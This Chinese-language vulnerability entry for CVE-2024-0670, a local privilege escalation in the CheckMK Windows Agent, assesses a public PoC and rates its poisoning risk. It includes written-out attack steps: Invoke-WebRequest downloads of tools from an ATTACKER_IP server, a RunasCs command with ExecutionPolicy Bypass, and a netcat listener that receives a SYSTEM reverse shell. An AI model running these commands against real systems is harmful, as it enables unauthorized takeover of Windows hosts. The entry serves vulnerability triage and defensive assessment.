## CVE-2024-0670 - CheckMK Windows Agent 本地权限提升 (Local Privilege Escalation)

**漏洞编号:** CVE-2024-0670

**漏洞类型:** 本地权限提升 (Local Privilege Escalation)

**影响应用:** CheckMK Windows Agent

**危害等级:** High

**CVSS评分:** 7.8 HIGH (CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)

**影响版本:** Checkmk Agent prior to 2.2.0p26, 2.1.0p43, 2.0.0p39 (EOL) and all versions of Checkmk 2.3.0.

**利用条件:** 需要低权限本地用户访问，PowerShell 启用，CheckMK Windows Agent 已安装，能够下载文件。

**POC 可用性:** 9

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 15%

## 详情

POC有效性分析:
该POC详细描述并演示了CheckMK Windows Agent中的本地权限提升（LPE）漏洞，编号为CVE-2024-0670。此漏洞的本质在于CheckMK MSI修复机制在执行过程中，会从`C:\Windows\Temp\`目录加载并执行特定名称的文件，而这些文件是以`NT AUTHORITY\SYSTEM`的最高权限运行的。如果一个低权限用户能够在该目录下放置具有可预测名称的恶意文件，即可实现权限提升。

POC提供的文件包括：
1.  `exploit.ps1`：核心PowerShell脚本，负责创建恶意payload文件（如`check_mk_agent.msi.log`等），并触发MSI修复过程以执行这些文件。
2.  `RunasCs.exe`：一个自定义的C#二进制文件，用于以指定用户凭据执行命令，支持明文密码。其源代码`RunasCs.cs`也被提供，允许用户审计和自行编译，增加了透明度。
3.  `nc.exe`：标准的Netcat工具，用于建立反向Shell连接。

利用流程清晰且可重现：攻击者首先在其机器上设置一个HTTP服务器，用于托管`RunasCs.exe`和`nc.exe`。接着，在目标Windows机器上，一个拥有低权限的用户通过`Invoke-WebRequest`从攻击者服务器下载上述工具和`exploit.ps1`至`C:\Windows\Temp\`目录。随后，通过`RunasCs.exe`以低权限用户身份执行`exploit.ps1`。`exploit.ps1`脚本将利用MSI修复漏洞，使得预先放置在`C:\Windows\Temp\`中的恶意代码以SYSTEM权限执行，最终建立一个指向攻击者机器的SYSTEM权限反向Shell。整个过程的文档非常完整，步骤明确，提供了必要的文件和代码，使得此POC具有很高的可用性和可信度。通过分析，该POC被认为是一个功能完整的、能够成功利用CVE-2024-0670漏洞的利用代码。

利用步骤:
攻击者成功利用此漏洞需要以下步骤：
1.  **攻击者环境准备：**
    *   在攻击者机器上，启动一个简单的HTTP服务器。例如，可以使用Python的`http.server`模块（`python -m http.server 8000`），将`RunasCs.exe`和`nc.exe`放置在HTTP服务器的根目录。
    *   启动一个Netcat监听器，用于接收来自目标机器的反向Shell。例如：`nc -lvnp 1111`。
2.  **目标机器工具部署：**
    *   在目标Windows机器上，通过低权限用户的身份，使用PowerShell命令从攻击者HTTP服务器下载必要的利用工具和脚本到`C:\Windows\Temp\`目录：
        ```powershell
        Invoke-WebRequest -Uri "http://ATTACKER_IP:8000/RunasCs.exe" -OutFile "C:\Windows\Temp\RunasCs.exe"
        Invoke-WebRequest -Uri "http://ATTACKER_IP:8000/nc.exe" -OutFile "C:\Windows\Temp\nc.exe"
        Invoke-WebRequest -Uri "http://ATTACKER_IP:8000/exploit.ps1" -OutFile "C:\Windows\Temp\exploit.ps1"
        ```
3.  **执行漏洞利用：**
    *   在目标机器上，以当前低权限用户身份执行`RunasCs.exe`，并指示其执行`exploit.ps1`：
        ```powershell
        .\RunasCs.exe username "password" "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Windows\Temp\exploit.ps1"
        ```
        其中，`username`和`password`是当前低权限用户的登录凭据。
4.  **权限提升与反向Shell：**
    *   `exploit.ps1`脚本运行后，会触发CheckMK MSI的修复过程，并利用漏洞执行预先放置的恶意文件。
    *   如果利用成功，攻击者机器上的Netcat监听器将接收到一个以`NT AUTHORITY\SYSTEM`权限运行的反向Shell。

投毒风险分析:
该POC的投毒风险评估为**低（约15%）**。主要基于以下分析：
1.  **代码透明度高：** 核心利用脚本`exploit.ps1`是PowerShell代码，易于审查和理解其功能。`RunasCs.exe`虽然是编译后的二进制文件，但其源代码`RunasCs.cs`已提供，允许安全研究人员和防御者进行详细审计，验证其行为是否与描述一致，从而降低了该组件被恶意篡改的风险。
2.  **外部依赖控制权：** POC明确指示用户需要自行在攻击者机器上搭建HTTP服务器，并托管`RunasCs.exe`和`nc.exe`。这意味着用户对所使用的外部二进制文件有直接的控制权和来源验证的机会。如果用户从POC提供的仓库中获取这些文件（或从源代码自行编译`RunasCs.exe`），并按照说明进行操作，投毒风险较低。
3.  **无明显恶意行为：** 对提供的POC代码进行分析，未发现明显的恶意混淆、加密通信到未知C2服务器、下载并执行未知payload、持久化机制、凭据窃取或其他超出其声称的LPE功能之外的恶意行为。`nc.exe`是渗透测试中常用的合法工具。
4.  **潜在风险点：**
    *   **第三方分发篡改：** 如果此POC被第三方恶意攻击者获取并修改后重新分发，例如将`nc.exe`替换为带有额外恶意功能的版本，或者修改`exploit.ps1`以包含后门或数据窃取逻辑，那么用户在未经严格审计的情况下使用这些被篡改的版本将面临较高的风险。
    *   **不安全的工具获取：** 用户如果未从官方或可信来源获取`nc.exe`，而是从互联网上随机下载，也可能引入恶意软件。
    *   **滥用：** 尽管POC明确声明仅用于教育和授权渗透测试，但任何漏洞利用工具都可能被滥用，导致未经授权的访问和损害。
综上所述，虽然利用过程涉及下载外部文件，但由于核心组件源代码的提供以及对用户自行托管的依赖，该POC本身的投毒风险较低。然而，使用者在实际操作前务必确保所有文件的来源可靠性，并进行必要的代码审计，以防范潜在的第三方篡改风险。

**项目地址:** 

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2024-0670
